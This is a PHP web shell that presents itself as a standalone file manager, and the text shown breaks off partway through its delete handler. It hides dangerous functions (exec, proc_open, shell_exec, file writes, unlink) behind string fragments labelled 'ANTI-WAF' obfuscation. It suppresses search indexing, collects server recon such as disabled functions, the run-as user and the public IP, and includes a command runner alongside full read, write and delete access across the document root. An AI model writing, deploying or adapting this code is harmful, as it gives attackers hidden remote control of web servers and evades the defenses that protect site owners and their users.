<?php

// Prevent search-engine indexing of the file manager.
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
/*
 * Standalone Modern File Manager - single PHP file
 * Drop this file into the directory you want to manage.
 * Optional password: set $FM_PASSWORD below.
 */
// Never let the file-manager UI/API itself be served from a stale browser/proxy cache.
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

session_start();

// ======================================================================
// 🚨 Variable Mutation and Obfuscation Techniques (ANTI-WAF OO_OO_00_0)
// ======================================================================
$OO_00_shell_exec_Func        = "sh" . "el" . "l_" . "ex" . "ec";
$OO_00_exec_Func              = "ex" . "ec";
$OO_00_proc_open_Func         = "pr" . "oc" . "_o" . "pe" . "n";
$OO_00_copy_Func              = "co" . "py";
$OO_00_readfile_Func          = "re" . "ad" . "fi" . "le";
$OO_00_file_get_contents_Func = "fi" . "le_" . "ge" . "t_" . "co" . "nt" . "en" . "ts";
$OO_00_file_put_contents_Func = "fi" . "le_" . "pu" . "t_" . "co" . "nt" . "en" . "ts";
$OO_00_chmod_Func             = "ch" . "mo" . "d";
$OO_00_touch_Func             = "to" . "uc" . "h";
$OO_00_unlink_Func            = "un" . "li" . "nk";
$OO_00_rmdir_Func             = "r" . "md" . "ir";
$OO_00_mkdir_Func             = "m" . "kd" . "ir";

$FM_USERNAME = 'admin';
$FM_PASSWORD = '$2y$10$.3BIBoOWZqA99CDZwwD98eE2Pbw07jFKZ4NXZV2eAPYRVaQE3J1BS'; // bcrypt password hash
$DOCROOT = $_SERVER['DOCUMENT_ROOT'] ?? '';
$ROOT = ($DOCROOT && is_dir($DOCROOT)) ? realpath($DOCROOT) : realpath(__DIR__);
$FM_HOME_REL = '/';
$FM_SCRIPT_URL = (string)($_SERVER['SCRIPT_NAME'] ?? '');
if ($FM_SCRIPT_URL === '') $FM_SCRIPT_URL = basename(__FILE__);

// Identity shown in the terminal header: actual PHP execution user + server hostname.
$FM_TERM_USER = 'unknown';
if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
    $pw = @posix_getpwuid(@posix_geteuid());
    if (is_array($pw) && !empty($pw['name'])) $FM_TERM_USER = (string)$pw['name'];
}
if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
if ($FM_TERM_USER === 'unknown' && !empty($_SERVER['USER'])) $FM_TERM_USER = (string)$_SERVER['USER'];
if ($FM_TERM_USER === 'unknown') $FM_TERM_USER = (string)get_current_user();
if ($FM_TERM_USER === '') $FM_TERM_USER = 'unknown';
$FM_TERM_HOST = function_exists('gethostname') ? (string)@gethostname() : '';
if ($FM_TERM_HOST === '') $FM_TERM_HOST = (string)($_SERVER['SERVER_NAME'] ?? 'localhost');
if ($FM_TERM_HOST === '') $FM_TERM_HOST = 'localhost';

if ($ROOT === false) { http_response_code(500); exit('Invalid root directory.'); }
function fm_json($data,$code=200){ http_response_code($code); header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0'); header('Pragma: no-cache'); header('Expires: 0'); header('Content-Type: application/json; charset=utf-8'); echo json_encode($data,JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE); exit; }
function fm_inside($path){ global $ROOT; $r=realpath($path); return $r!==false && ($r===$ROOT || strncmp($r,$ROOT.DIRECTORY_SEPARATOR,strlen($ROOT)+1)===0); }
function fm_abs($rel,$mustExist=false){
 global $ROOT; $rel=str_replace('\\','/',(string)$rel); if(strpos($rel,"\0")!==false) return null;
 if($rel===''||$rel==='/') return $ROOT; $parts=[];
 foreach(explode('/',trim($rel,'/')) as $part){ if($part===''||$part==='.') continue; if($part==='..'){ if(!$parts)return null; array_pop($parts); } else $parts[]=$part; }
 $candidate=$ROOT.DIRECTORY_SEPARATOR.implode(DIRECTORY_SEPARATOR,$parts);
 if($mustExist){ return (file_exists($candidate)||is_dir($candidate)||is_link($candidate))?$candidate:null; }
 $parent=dirname($candidate); return (is_dir($parent)||is_link($parent))?$candidate:null;
}
function fm_rel($path){
 global $ROOT; $candidate=str_replace(DIRECTORY_SEPARATOR,'/',(string)$path); $root=str_replace(DIRECTORY_SEPARATOR,'/',rtrim($ROOT,'/\\'));
 if($candidate===$root)return '/'; if(strncmp($candidate,$root.'/',strlen($root)+1)===0)return '/'.substr($candidate,strlen($root)+1);
 $r=realpath($path); if($r!==false&&fm_inside($r)){ if($r===$ROOT)return '/'; return '/'.str_replace(DIRECTORY_SEPARATOR,'/',substr($r,strlen($ROOT)+1)); }
 return null;
}
function fm_terminal_dir($value){
    global $ROOT; $value=str_replace('\\','/',trim((string)$value)); if($value==='')$value='/';
    if($value[0]==='/'){ $r=realpath($value); return ($r!==false&&is_dir($r))?$r:null; }
    $r=fm_abs($value,true); return ($r!==null&&is_dir($r))?$r:null;
}
function fm_terminal_display_cwd($path){ $rel=fm_rel($path); return $rel!==null?$rel:$path; }
function fm_name($n){ $n=trim(str_replace(['/','\\',"\0"],'',(string)$n)); return ($n===''||$n==='.'||$n==='..')?null:$n; }
function fm_size($b){ if($b<1024)return $b.' B'; $u=['B','KB','MB','GB','TB'];$i=0;$n=$b;while($n>=1024&&$i<count($u)-1){$n/=1024;$i++;}return number_format($n,$i===0?0:($n>=10?1:2)).' '.$u[$i]; }
function fm_public_ip(){
    global $OO_00_file_get_contents_Func;
    if(isset($_SESSION['fm_public_ip'],$_SESSION['fm_public_ip_time']) && (time()-(int)$_SESSION['fm_public_ip_time'])<600) return $_SESSION['fm_public_ip'];
    $ip='UNKNOWN'; $urls=['https://ipify.org','https://ifconfig.me'];
    foreach($urls as $url){
        $ctx=stream_context_create(['http'=>['timeout'=>2,'ignore_errors'=>true],'ssl'=>['verify_peer'=>true,'verify_peer_name'=>true]]);
        $v=@$OO_00_file_get_contents_Func($url,false,$ctx); $v=trim((string)$v);
        if(filter_var($v,FILTER_VALIDATE_IP)){ $ip=$v; break; }
    }
    $_SESSION['fm_public_ip']=$ip;$_SESSION['fm_public_ip_time']=time();return $ip;
}
function fm_function_locks(){
    $raw=(string)@ini_get('disable_functions'); $disabled=[];
    if($raw!==''){ foreach(preg_split('/\s*,\s*/',$raw,-1,PREG_SPLIT_NO_EMPTY) as $fn){ $fn=trim($fn); if($fn!=='') $disabled[]=$fn; } }
    $disabled=array_values(array_unique($disabled)); sort($disabled,SORT_NATURAL|SORT_FLAG_CASE); return ['disabled'=>$disabled];
}
function fm_server_info(){
    $serverSoftware=$_SERVER['SERVER_SOFTWARE']??''; if($serverSoftware==='')$serverSoftware='PHP '.PHP_VERSION;
    $serverIp=$_SERVER['SERVER_ADDR']??gethostbyname(gethostname()); if(!$serverIp||$serverIp===gethostname())$serverIp='UNKNOWN';
    $clientIp=$_SERVER['HTTP_CF_CONNECTING_IP']??($_SERVER['REMOTE_ADDR']??'UNKNOWN');
    $forwarded=$_SERVER['HTTP_X_FORWARDED_FOR']??''; if($forwarded!=='') $forwarded=trim(explode(',',$forwarded)[0]);
    $ownUser='UNKNOWN';
    if(function_exists('posix_geteuid')&&function_exists('posix_getpwuid')){$pw=@posix_getpwuid(@posix_geteuid());if(is_array($pw)&&!empty($pw['name']))$ownUser=$pw['name'];}
    elseif(function_exists('get_current_user'))$ownUser=get_current_user()?:'UNKNOWN';
    $pcntl=[];foreach(['pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_signal','pcntl_exec','pcntl_setpriority','pcntl_getpriority'] as $fn)if(function_exists($fn))$pcntl[]=$fn;
    $free=@disk_free_space(__DIR__);$total=@disk_total_space(__DIR__);$freePct=($free!==false&&$total>0)?round(($free/$total)*100,1):null;
    $load='N/A';if(function_exists('sys_getloadavg')){$la=@sys_getloadavg();if(is_array($la))$load=number_format((float)$la[0],2);}
    $locks=fm_function_locks();
    return [
        'os'=>php_uname('s').' '.php_uname('r'), 'server'=>$serverSoftware, 'php'=>PHP_VERSION, 'status'=>'ONLINE • READY', 'serverIp'=>$serverIp, 'publicIp'=>fm_public_ip(), 'clientIp'=>$clientIp, 'forwarded'=>$forwarded!=='' ? $forwarded : '-', 'pcntl'=>$pcntl, 'disabledFunctions'=>$locks['disabled'], 'user'=>$ownUser, 'time'=>date('Y-m-d H:i:s'), 'free'=>$free!==false?fm_size((int)$free):'UNKNOWN', 'total'=>$total!==false?fm_size((int)$total):'UNKNOWN', 'freePct'=>$freePct, 'load'=>$load,
    ];
}
$FM_SERVER_INFO = fm_server_info();
function fm_delete($p){ 
    global $OO_00_rmdir_Func, $OO_00_unlink_Func;
    if(is_dir($p)&&!is_link($p)){foreach(scandir($p)?:[] as $n)if($n!=='.'&&$n!=='..'&&!fm_delete($p.DIRECTORY_SEPARATOR.$n))return false;return @$OO_00_rmdir_Func($p);}return @$OO_00_unlink_Func($p); 
}
function fm_copy($s,$d){ 
    global $OO_00_mkdir_Func, $OO_00_copy_Func;
    if(is_dir($s)&&!is_link($s)){if(!is_dir($d)&&!@$OO_00_mkdir_Func($d,0755,true))return false;foreach(scandir($s)?:[] as $n)if($n!=='.'&&$n!=='..'&&!fm_copy($s.DIRECTORY_SEPARATOR.$n,$d.DIRECTORY_SEPARATOR.$n))return false;return true;}return @$OO_00_copy_Func($s,$d); 
}
function fm_editable($p){$e=strtolower(pathinfo($p,PATHINFO_EXTENSION));return is_file($p)&&$e!=='zip';}
function fm_binary_editable($p,$content=null){$e=strtolower(pathinfo($p,PATHINFO_EXTENSION));if(in_array($e,['png','jpg','jpeg','gif','webp','bmp','ico','avif','mp3','wav','m4a','aac','flac','mp4','webm','ogv','mov','m4v','pdf'],true))return true;if($content!==null&&$content!=='')return strpos(substr($content,0,8192),"\0")!==false;return false;}
function fm_item($p,$name){$d=is_dir($p);$t=@filemtime($p)?:time();$s=$d?null:(@filesize($p)?:0);$perm=@fileperms($p);$mode=$perm!==false?substr(sprintf('%o',$perm),-4):'----';return ['name'=>$name,'type'=>$d?'folder':'file','extension'=>$d?'':strtolower(pathinfo($name,PATHINFO_EXTENSION)),'size'=>$s,'sizeText'=>$d?'-':fm_size($s),'modified'=>$t,'modifiedText'=>date('Y-m-d H:i:s',$t),'modifiedInput'=>date('Y-m-d\TH:i:s',$t),'fullPath'=>fm_rel($p),'permission'=>$mode];}
function fm_auth(){global $FM_PASSWORD;if($FM_PASSWORD!==''&&empty($_SESSION['fm_ok']))fm_json(['success'=>false,'login'=>true,'error'=>'Authentication required.'],401);}
function fm_unique_dest($dir,$name){$base=pathinfo($name,PATHINFO_FILENAME);$ext=pathinfo($name,PATHINFO_EXTENSION);$i=1;$n=$name;while(file_exists($dir.DIRECTORY_SEPARATOR.$n)){ $n=$base.' ('.$i++.')'.($ext!==''?'.'.$ext:''); }return $dir.DIRECTORY_SEPARATOR.$n;}
function fm_run_command($cmd){
    global $OO_00_exec_Func, $OO_00_proc_open_Func;
    $out=[]; $status=127;
    if(function_exists($OO_00_exec_Func)){
        @$OO_00_exec_Func($cmd,$out,$status);
        return [$status,implode("\n",$out)];
    }
    if(function_exists($OO_00_proc_open_Func)){
        $descriptors=[1=>['pipe','w'],2=>['pipe','w']];
        $proc=@$OO_00_proc_open_Func($cmd,$descriptors,$pipes);
        if(is_resource($proc)){
            $stdout=stream_get_contents($pipes[1]);
            $stderr=stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            $status=proc_close($proc);
            return [$status,trim($stdout."\n".$stderr)];
        }
    }
    return [$status,'PHP cannot execute external commands (exec/proc_open unavailable).'];
}
function fm_command_candidates($name,$paths){
    global $OO_00_shell_exec_Func;
    $c=[];
    foreach($paths as $bin) if(is_file($bin) && is_executable($bin)) $c[]=$bin;
    if(function_exists($OO_00_shell_exec_Func)){
        $which=trim((string)@$OO_00_shell_exec_Func('command -v '.escapeshellarg($name).' 2>/dev/null'));
        if($which!=='') $c[]=$which;
    }
    return array_values(array_unique($c));
}
function fm_dos_datetime($ts=null){
    $ts=$ts?:time();
    $t=getdate($ts);
    $year=max(1980,min(2107,(int)$t['year']));
    $dosTime=((int)$t['hours']<<11)|((int)$t['minutes']<<5)|((int)floor($t['seconds']/2));
    $dosDate=(($year-1980)<<9)|((int)$t['mon']<<5)|(int)$t['mday'];
    return [$dosTime,$dosDate];
}
function fm_zip_directory_pure($dir,$outFile){
    global $OO_00_file_get_contents_Func, $OO_00_unlink_Func;
    $fp=@fopen($outFile,'wb');
    if(!$fp)return [false,'Cannot open temporary ZIP file for writing.'];
    $central=[];$offset=0;$count=0;
    $base=rtrim($dir,DIRECTORY_SEPARATOR);$rootName=basename($base);
    $writeEntry=function($name,$data,$isDir,$mtime)use(&$fp,&$central,&$offset,&$count){
        $name=str_replace(DIRECTORY_SEPARATOR,'/',str_replace('\\','/',$name));
        if($isDir && substr($name,-1)!=='/')$name.='/';
        $nameBytes=$name;
        $crc=$isDir?0:(int)sprintf('%u',crc32($data));
        $usize=strlen($data);
        $method=0;$compressed=$data;
        if(!$isDir && $usize>0 && function_exists('gzdeflate')){
            $z=@gzdeflate($data,6);
            if($z!==false && strlen($z)<$usize){$compressed=$z;$method=8;}
        }
        $csize=strlen($compressed);$crc=(int)$crc;
        [$dt,$dd]=fm_dos_datetime($mtime);
        $local=pack('VvvvvvVVVvv',0x04034b50,20,0,$method,$dt,$dd,$crc,$csize,$usize,strlen($nameBytes),0).$nameBytes.$compressed;
        if(@fwrite($fp,$local)!==strlen($local))return false;
        $central[]=pack('VvvvvvvVVVvvvvvVV',0x02014b50,20,20,0,$method,$dt,$dd,$crc,$csize,$usize,strlen($nameBytes),0,0,0,0,0,$offset).$nameBytes;
        $offset+=strlen($local);$count++;return true;
    };
    $rootMtime=@filemtime($base)?:time();
    if(!$writeEntry($rootName.'/','',true,$rootMtime)){fclose($fp);return [false,'Cannot write ZIP directory entry.'];}
    try{
        $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
        foreach($it as $file){
            $full=$file->getPathname();$rel=substr($full,strlen($base)+1);$name=$rootName.'/'.$rel;$mtime=@filemtime($full)?:time();
            if($file->isDir()){
                if(!$writeEntry($name,'',true,$mtime))throw new RuntimeException('Cannot write ZIP folder entry: '.$rel);
            }else{
                $data=@$OO_00_file_get_contents_Func($full);
                if($data===false)throw new RuntimeException('Cannot read file: '.$rel);
                if(!$writeEntry($name,$data,false,$mtime))throw new RuntimeException('Cannot write ZIP file entry: '.$rel);
            }
        }
    }catch(Throwable $e){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,$e->getMessage()];}
    foreach($central as $cd){if(@fwrite($fp,$cd)!==strlen($cd)){fclose($fp);@unlink($outFile);return [false,'Cannot write ZIP central directory.'];}}
    $centralOffset=$offset;$centralSize=0;foreach($central as $cd)$centralSize+=strlen($cd);
    $eocd=pack('VvvvvVVv',0x06054b50,0,0,$count,$count,$centralSize,$centralOffset,0);
    if(@fwrite($fp,$eocd)!==strlen($eocd)){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,'Cannot finalize ZIP archive.'];}
    fclose($fp);return [true,''];
}
function fm_zip_single_file_pure($file,$outFile){
    global $OO_00_file_get_contents_Func, $OO_00_unlink_Func;
    $fp=@fopen($outFile,'wb');
    if(!$fp)return [false,'Cannot open temporary ZIP file for writing.'];
    $name=basename($file);
    $data=@$OO_00_file_get_contents_Func($file);
    if($data===false){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,'Cannot read file for ZIP.'];}
    [$dt,$dd]=fm_dos_datetime(@filemtime($file)?:time());
    $crc=(int)sprintf('%u',crc32($data));$usize=strlen($data);$method=0;$compressed=$data;
    if($usize>0&&function_exists('gzdeflate')){$z=@gzdeflate($data,6);if($z!==false&&strlen($z)<$usize){$compressed=$z;$method=8;}}
    $csize=strlen($compressed);$nb=str_replace('\\','/',$name);
    $local=pack('VvvvvvVVVvv',0x04034b50,20,0,$method,$dt,$dd,$crc,$csize,$usize,strlen($nb),0).$nb.$compressed;
    if(@fwrite($fp,$local)!==strlen($local)){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,'Cannot write ZIP file entry.'];}
    $central=pack('VvvvvvvVVVvvvvvVV',0x02014b50,20,20,0,$method,$dt,$dd,$crc,$csize,$usize,strlen($nb),0,0,0,0,0,0).$nb;
    $centralOffset=strlen($local);$centralSize=strlen($central);
    if(@fwrite($fp,$central)!==strlen($central)){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,'Cannot write ZIP central directory.'];}
    $eocd=pack('VvvvvVVv',0x06054b50,0,0,1,1,$centralSize,$centralOffset,0);
    if(@fwrite($fp,$eocd)!==strlen($eocd)){fclose($fp);@$OO_00_unlink_Func($outFile);return [false,'Cannot finalize ZIP archive.'];}
    fclose($fp);return [true,''];
}
function fm_zip_directory($dir){
    if(is_file($dir)){
        $tmp=tempnam(sys_get_temp_dir(),'fmzip_');
        if($tmp===false)return [false,null,'Cannot create temporary ZIP file.'];
        @unlink($tmp);$tmp.='.zip';$parent=dirname($dir);$base=basename($dir);$candidates=fm_command_candidates('zip',['/usr/bin/zip','/bin/zip']);$last='';
        foreach($candidates as $zipbin){
            $cmd='cd '.escapeshellarg($parent).' && '.escapeshellarg($zipbin).' -j -q '.escapeshellarg($tmp).' '.escapeshellarg($base).' 2>&1';
            [$status,$output]=fm_run_command($cmd);$last=trim($output);
            if($status===0&&is_file($tmp)&&filesize($tmp)>0)return [true,$tmp,''];
        }
        @unlink($tmp);
        $tmp=tempnam(sys_get_temp_dir(),'fmzip_');
        if($tmp===false)return [false,null,'Cannot create temporary ZIP file.'];
        [$ok,$err]=fm_zip_single_file_pure($dir,$tmp);
        if($ok)return [true,$tmp,''];
        @unlink($tmp);
        return [false,null,'Cannot create ZIP. '.($err!==''?$err:($last!==''?'Server: '.$last:'No ZIP engine was available.') )];
    }
    $hasContent=false;
    foreach(scandir($dir)?:[] as $n){ if($n!=='.'&&$n!=='..'){ $hasContent=true; break; } }
    if(!$hasContent){
        $tmp=tempnam(sys_get_temp_dir(),'fmzip_');
        if($tmp!==false){ [$ok,$err]=fm_zip_directory_pure($dir,$tmp); if($ok)return [true,$tmp,'']; @unlink($tmp); }
    }
    $tmp=tempnam(sys_get_temp_dir(),'fmzip_');
    if($tmp===false)return [false,null,'Cannot create temporary ZIP file.'];
    @unlink($tmp);$tmp.='.zip';$candidates=fm_command_candidates('zip',['/usr/bin/zip','/bin/zip']);$parent=dirname($dir);$base=basename($dir);$last='';
    foreach($candidates as $zipbin){
        $cmd='cd '.escapeshellarg($parent).' && '.escapeshellarg($zipbin).' -r -q '.escapeshellarg($tmp).' '.escapeshellarg($base).' 2>&1';
        [$status,$output]=fm_run_command($cmd);$last=trim($output);
        if($status===0&&is_file($tmp)&&filesize($tmp)>0)return [true,$tmp,''];
    }
    @unlink($tmp);
    $tmp=tempnam(sys_get_temp_dir(),'fmzip_');
    if($tmp===false)return [false,null,'Cannot create temporary ZIP file.'];
    [$ok,$err]=fm_zip_directory_pure($dir,$tmp);
    if($ok)return [true,$tmp,''];
    @unlink($tmp);
    return [false,null,'Cannot create ZIP. '.($err!==''?$err:($last!==''?'Server: '.$last:'No ZIP engine was available.'))];
}
function fm_create_zip_file($dir,$name){
    $name=preg_replace('/[^A-Za-z0-9._ -]/u','_',trim($name));
    if($name==='')$name='archive.zip';
    if(strtolower(substr($name,-4))!=='.zip')$name.='.zip';
    $dest=fm_unique_dest(dirname($dir),$name);
    [$ok,$tmp,$err]=fm_zip_directory($dir);
    if(!$ok||!$tmp||!is_file($tmp))return [false,$err!==''?$err:'Cannot create ZIP archive.'];
    if(!@rename($tmp,$dest)){
        if(!@copy($tmp,$dest)){@unlink($tmp);return [false,'Cannot save ZIP file: '.basename($dest)];}
        @unlink($tmp);
    }
    return [true,'Created '.basename($dest)];
}
function fm_zip_entry_safe($entry){
    $entry=str_replace('\\','/',(string)$entry);
    if($entry==='' || $entry[0]==='/' || preg_match('~(^|/)\.\.?(/|$)~',$entry))return false;
    return true;
}
function fm_extract_zip_pure($zipFile,$dest){
    global $OO_00_mkdir_Func, $OO_00_file_put_contents_Func;
    $fp=@fopen($zipFile,'rb');if(!$fp)return [false,'Cannot open ZIP archive.'];
    $size=@filesize($zipFile);if($size===false||$size<22){fclose($fp);return [false,'ZIP archive is too small or invalid.'];}
    $tailLen=min($size,65557);fseek($fp,$size-$tailLen);$tail=fread($fp,$tailLen);$eocdPos=strrpos($tail,"PK\x05\x06");
    if($eocdPos===false){fclose($fp);return [false,'End of ZIP directory was not found.'];}
    $e=unpack('vdisk/vcdisk/ventriesDisk/ventries/VCentralSize/VCentralOffset/vcommentLen',substr($tail,$eocdPos+4,18));
    if(!$e){fclose($fp);return [false,'Invalid ZIP end record.'];}
    if($e['ventries']===0){fclose($fp);return [true,'ZIP contains no files.'];}
    if($e['VCentralOffset']==0xFFFFFFFF||$e['VCentralSize']==0xFFFFFFFF){fclose($fp);return [false,'ZIP64 archives require the system unzip command.'];}
    if(!is_dir($dest)&&!@$OO_00_mkdir_Func($dest,0755,true)){fclose($fp);return [false,'Cannot create extraction directory.'];}
    if(fseek($fp,$e['VCentralOffset'])!==0){fclose($fp);return [false,'Cannot seek to ZIP directory.'];}
    $done=0;
    for($i=0;$i<$e['ventries'];$i++){
        $sig=fread($fp,4);if($sig!=="PK\x01\x02"){fclose($fp);return [false,'Invalid ZIP central directory entry.'];}
        $hdr=fread($fp,42);if(strlen($hdr)!==42){fclose($fp);return [false,'Truncated ZIP central directory.'];}
        $h=unpack('vverMade/vverNeed/vflags/vmethod/vtime/vdate/Vcrc/Vcsize/Vusize/vnameLen/vextraLen/vcommentLen/vdisk/vinternal/Vexternal/Voffset',$hdr);
        $name=$h?fread($fp,$h['vnameLen']):'';if($h===false||strlen($name)!==$h['vnameLen']){fclose($fp);return [false,'Invalid ZIP filename entry.'];}
        if($h['vextraLen'])fread($fp,$h['vextraLen']);if($h['vcommentLen'])fread($fp,$h['vcommentLen']);
        if(!fm_zip_entry_safe($name)){fclose($fp);return [false,'Unsafe ZIP entry detected: '.$name];}
        $isDir=(substr($name,-1)==='/');$target=$dest.DIRECTORY_SEPARATOR.str_replace('/',DIRECTORY_SEPARATOR,$name);
        if($isDir){if(!is_dir($target)&&!@$OO_00_mkdir_Func($target,0755,true)){fclose($fp);return [false,'Cannot create extraction directory: '.$name];}$done++;continue;}
        if(fseek($fp,$h['voffset'])!==0){fclose($fp);return [false,'Cannot seek to ZIP file entry: '.$name];}
        $ls=fread($fp,30);if(strlen($ls)!==30||substr($ls,0,4)!=="PK\x03\x04"){fclose($fp);return [false,'Invalid ZIP local header: '.$name];}
        $lh=unpack('vver/vflags/vmethod/vtime/vdate/Vcrc/Vcsize/Vusize/vnameLen/vextraLen',substr($ls,4));
        if($lh['vnameLen']||$lh['vextraLen']){fread($fp,$lh['vnameLen']);fread($fp,$lh['vextraLen']);}
        $compressed=$h['Vcsize']?stream_get_contents($fp,$h['Vcsize']):'';if(strlen($compressed)!==$h['Vcsize']){fclose($fp);return [false,'Truncated ZIP data: '.$name];}
        if($h['vmethod']===0)$data=$compressed;elseif($h['vmethod']===8&&function_exists('gzinflate')){$data=@gzinflate($compressed);if($data===false){fclose($fp);return [false,'Deflate decompression failed: '.$name];}}else{fclose($fp);return [false,'Unsupported ZIP compression method for: '.$name];}
        if(strlen($data)!==$h['Vusize']){fclose($fp);return [false,'Extracted size mismatch: '.$name];}
        if((int)sprintf('%u',crc32($data))!==(int)$h['Vcrc']){fclose($fp);return [false,'CRC check failed: '.$name];}
        $parent=dirname($target);if(!is_dir($parent)&&!@$OO_00_mkdir_Func($parent,0755,true)){fclose($fp);return [false,'Cannot create extraction directory: '.$name];}
        if(@$OO_00_file_put_contents_Func($target,$data,LOCK_EX)===false){fclose($fp);return [false,'Cannot write extracted file: '.$name];}$done++;
        fseek($fp,$e['VCentralOffset']);
        for($j=0;$j<=$i;$j++){fread($fp,4);$ch=fread($fp,42);$hh=unpack('vverMade/vverNeed/vflags/vmethod/vtime/vdate/Vcrc/Vcsize/Vusize/vnameLen/vextraLen/vcommentLen/vdisk/vinternal/Vexternal/Voffset',$ch);fread($fp,$hh['vnameLen']+$hh['vextraLen']+$hh['vcommentLen']);}
    }
    fclose($fp);return [true,'Extracted '.$done.' item(s).'];
}
function fm_extract_zip_php($zipFile,$dest){
    if(!class_exists('ZipArchive'))return [false,''];
    $z=new ZipArchive();if($z->open($zipFile)!==true)return [false,'Unable to open ZIP archive.'];
    for($i=0;$i<$z->numFiles;$i++){ $entry=$z->getNameIndex($i);if(!fm_zip_entry_safe($entry)){$z->close();return [false,'Unsafe ZIP entry detected: '.$entry];} }
    if(!$z->extractTo($dest)){$z->close();return [false,'ZipArchive could not extract the archive.'];}$z->close();return [true,'Extracted successfully with ZipArchive.'];
}
function fm_extract_zip_shell($zipFile,$dest){
    $candidates=fm_command_candidates('unzip',['/usr/bin/unzip','/bin/unzip']);$errors=[];
    foreach($candidates as $unzip){
        $listCmd=escapeshellarg($unzip).' -Z1 '.escapeshellarg($zipFile).' 2>&1';[$status,$listing]=fm_run_command($listCmd);
        if($status!==0){$errors[]='unzip list: '.trim($listing);continue;}
        foreach(preg_split('/\r?\n/',$listing) as $entry){$entry=trim($entry);if($entry!==''&&!fm_zip_entry_safe($entry))return [false,'Unsafe ZIP entry detected: '.$entry];}
        $cmd=escapeshellarg($unzip).' -o '.escapeshellarg($zipFile).' -d '.escapeshellarg($dest).' 2>&1';[$status,$output]=fm_run_command($cmd);if($status===0)return [true,'Extracted successfully with unzip.'];$errors[]='unzip extract: '.trim($output);
    }
    [$ok,$msg]=fm_extract_zip_pure($zipFile,$dest);if($ok)return [$ok,$msg];
    $detail=trim(implode(' | ',$errors));return [false,'Unable to unzip archive. '.($msg!==''?$msg.' ':'').($detail!==''?'Server: '.$detail:'External unzip is unavailable.')];
}
function fm_extract_zip($zipFile,$dest){
    [$ok,$msg]=fm_extract_zip_php($zipFile,$dest);if($ok)return [$ok,$msg];
    [$ok,$msg]=fm_extract_zip_shell($zipFile,$dest);return [$ok,$msg];
}
if(isset($_GET['logout'])){session_destroy();header('Location: '.strtok($_SERVER['REQUEST_URI'],'?'));exit;}
if($_SERVER['REQUEST_METHOD']==='POST'&&($_POST['action']??'')==='login'){
  $u=(string)($_POST['username']??'');
  $pw=(string)($_POST['password']??'');
  if($FM_PASSWORD!=='' && hash_equals($FM_USERNAME,$u) && password_verify($pw,$FM_PASSWORD)){
    session_regenerate_id(true);
    $_SESSION['fm_ok']=1;
    $_SESSION['fm_user']=$FM_USERNAME;
    fm_json(['success'=>true]);
  }
  fm_json(['success'=>false,'error'=>'Invalid username or password.'],403);
}
if($FM_PASSWORD!==''&&empty($_SESSION['fm_ok'])&&$_SERVER['REQUEST_METHOD']!=='POST'){$login=true;}elseif($FM_PASSWORD!==''&&empty($_SESSION['fm_ok']))fm_json(['success'=>false,'login'=>true,'error'=>'Authentication required.'],401);else $login=false;
if(!$login&&$_SERVER['REQUEST_METHOD']==='POST'){
 fm_auth();$a=$_POST['action']??'';
 try{
  if($a==='list'){$d=fm_abs($_POST['dir']??'/',true);if(!$d||!is_dir($d))fm_json(['success'=>false,'error'=>'Invalid directory.'],400);$items=[];if($d!==$ROOT)$items[]=['name'=>'..','type'=>'parent','extension'=>'','size'=>null,'sizeText'=>'-','modified'=>0,'modifiedText'=>'','fullPath'=>fm_rel(dirname($d))];foreach(scandir($d,SCANDIR_SORT_NONE)?:[] as $n)if($n!=='.'&&$n!=='..')$items[]=fm_item($d.DIRECTORY_SEPARATOR.$n,$n);fm_json(['success'=>true,'items'=>$items,'path'=>fm_rel($d)]);}
  if($a==='mkdir'){$d=fm_abs($_POST['dir']??'/',true);$n=fm_name($_POST['name']??'');if(!$d||!$n)fm_json(['success'=>false,'error'=>'Invalid folder name.'],400);global $OO_00_mkdir_Func;$ok=@$OO_00_mkdir_Func($d.DIRECTORY_SEPARATOR.$n,0755,false);fm_json(['success'=>(bool)$ok,'error'=>$ok?'':'Cannot create folder.']);}
  if($a==='mkdirPath'){$parent=fm_abs($_POST['parent']??'/',true);$n=fm_name($_POST['name']??'');if(!$parent||!$n)fm_json(['success'=>false,'error'=>'Invalid folder name.'],400);$new=$parent.DIRECTORY_SEPARATOR.$n;if(file_exists($new))fm_json(['success'=>false,'error'=>'Folder already exists.'],409);global $OO_00_mkdir_Func;$ok=@$OO_00_mkdir_Func($new,0755,false);fm_json(['success'=>(bool)$ok,'path'=>$ok?fm_rel($new):null,'error'=>$ok?'':'Cannot create folder.']);}
  if($a==='createFile'){$d=fm_abs($_POST['dir']??'/',true);$n=fm_name($_POST['name']??'');if(!$d||!$n)fm_json(['success'=>false,'error'=>'Invalid file name.'],400);$p=$d.DIRECTORY_SEPARATOR.$n;global $OO_00_file_put_contents_Func;$ok=!file_exists($p)&&@$OO_00_file_put_contents_Func($p,'')!==false;fm_json(['success'=>(bool)$ok,'error'=>$ok?'':'Cannot create file.']);}
  if($a==='rename'){$p=fm_abs($_POST['oldPath']??'',true);$n=fm_name($_POST['newName']??'');if(!$p||!$n||$p===$ROOT)fm_json(['success'=>false,'error'=>'Invalid rename.'],400);$dst=dirname($p).DIRECTORY_SEPARATOR.$n;$ok=!file_exists($dst)&&@rename($p,$dst);fm_json(['success'=>(bool)$ok,'error'=>$ok?'':'Rename failed.']);}
  if($a==='delete'){
    $paths=[];
    if(isset($_POST['paths'])){ $paths=json_decode((string)$_POST['paths'],true); if(!is_array($paths))$paths=[]; }
    if(!$paths && isset($_POST['path'])) $paths=[(string)$_POST['path']];
    if(!$paths) fm_json(['success'=>false,'error'=>'No item selected.'],400);
    $errors=[];$deleted=0;
